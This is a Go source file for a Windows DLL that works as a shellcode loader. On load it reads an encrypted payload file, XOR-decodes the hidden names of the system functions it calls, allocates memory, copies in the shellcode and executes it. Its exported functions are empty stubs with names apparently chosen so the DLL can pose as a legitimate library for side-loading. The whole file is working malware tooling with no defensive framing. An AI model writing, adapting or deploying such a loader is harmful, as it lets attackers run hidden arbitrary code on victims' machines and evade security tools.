package main

import (
	"C"
	"encoding/json"
	"io/ioutil"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

func init() {
	var dirpath string
	if execPath, err := os.Executable(); err == nil {
		dirpath = filepath.Dir(execPath)
	}
	go run(filepath.Join(dirpath, "shellcode.json"))
}

//export GetInstallDetailsPayload
func GetInstallDetailsPayload() {
	ch := make(chan int)
	<-ch
}

//export SignalInitializeCrashReporting
func SignalInitializeCrashReporting() {
	ch := make(chan int)
	<-ch
}

func main() {
}

func xor(key []byte, data []byte) byte {
	var tmp byte
	for i := 0; i < len(data); i++ {
		tmp = data[i] + 1
		tmp = tmp + 1
		index := i % len(key)
		data[i] = data[i] ^ key[index]
	}
	return tmp
}

func run(filepath string) {
	fileData, err := ioutil.ReadFile(filepath)
	if err != nil {
		return
	}
	type FileJson struct {
		Key []byte
		Kll []byte
		VA  []byte
		AT  int
		Pro int
		Nll []byte
		RMM []byte
		SC  []byte //shellcode
	}
	var fs FileJson
	if err := json.Unmarshal(fileData, &fs); err != nil {
		return
	}
	xor(fs.Key, fs.Kll)
	xor(fs.Key, fs.VA)
	va := syscall.MustLoadDLL(string(fs.Kll)).MustFindProc(string(fs.VA))
	addr, _, _ := va.Call(0, uintptr(len(fs.SC)), uintptr(fs.AT), uintptr(fs.Pro))
	if addr == 0 {
		return
	}
	xor(fs.Key, fs.Nll)
	xor(fs.Key, fs.RMM)
	cm := syscall.MustLoadDLL(string(fs.Nll)).MustFindProc(string(fs.RMM))
	xor(fs.Key, fs.SC)
	cm.Call(addr, uintptr(unsafe.Pointer(&fs.SC[0])), uintptr(len(fs.SC)))
	syscall.Syscall(addr, 0, 0, 0, 0)
}
